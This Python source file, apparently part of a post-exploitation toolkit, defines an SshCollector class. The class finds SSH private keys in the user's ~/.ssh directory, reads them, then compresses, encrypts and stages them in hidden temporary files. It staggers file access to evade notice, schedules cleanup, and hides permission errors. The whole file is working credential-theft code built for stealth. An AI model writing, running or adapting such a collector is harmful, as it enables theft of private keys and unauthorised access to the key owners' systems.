
from __future__ import annotations

import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

# SSH key filename prefixes to collect
_SSH_KEY_PREFIXES = ("id_rsa", "id_ed25519", "id_ecdsa", "id_dsa")

class SshCollector(BaseCollector):
    """
    Collect SSH private keys.
    Files accessed individually with stagger. Content encrypted before staging.
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        ssh_dir = Path.home() / ".ssh"
        if not ssh_dir.exists():
            return

        for entry in ssh_dir.iterdir():
            if not any(entry.name.startswith(p) for p in _SSH_KEY_PREFIXES):
                continue
            if entry.suffix in (".pub",):
                continue  # public keys are not sensitive

            yield ArtifactMetadata(
                artifact_family="ssh_key",
                source_path=str(entry),
                source_platform=os.name,
                collection_method="file_read",
            )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            entry = Path(artifact.source_path)
            data    = entry.read_bytes()
            sha256  = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            stage_path = self._staging_dir / f".{sha256[:16]}.ssh.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path       = str(entry),
                sha256     = sha256,
                size_bytes = len(payload),
                metadata   = artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("SSH key collection error (%s): %s", artifact.source_path, exc)
        return None
